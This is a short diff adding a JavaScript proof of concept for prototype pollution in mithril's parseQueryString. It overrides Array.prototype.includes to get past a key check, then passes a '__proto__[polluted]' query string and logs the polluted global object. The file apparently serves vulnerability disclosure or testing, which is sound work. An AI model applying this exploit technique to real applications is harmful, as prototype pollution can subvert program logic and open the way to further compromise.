@@ -1,0 +1,13 @@
+Array.prototype.includes = function (key) {
+    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
+        return false;
+    } else {
+        return true;
+    }
+};
+require('mithril/test-utils/browserMock')(global);
+const m = require('mithril');
+obj = {};
+console.log({}.polluted);
+m.parseQueryString('__proto__%5Bpolluted%5D=yes');
+console.log({}.polluted);
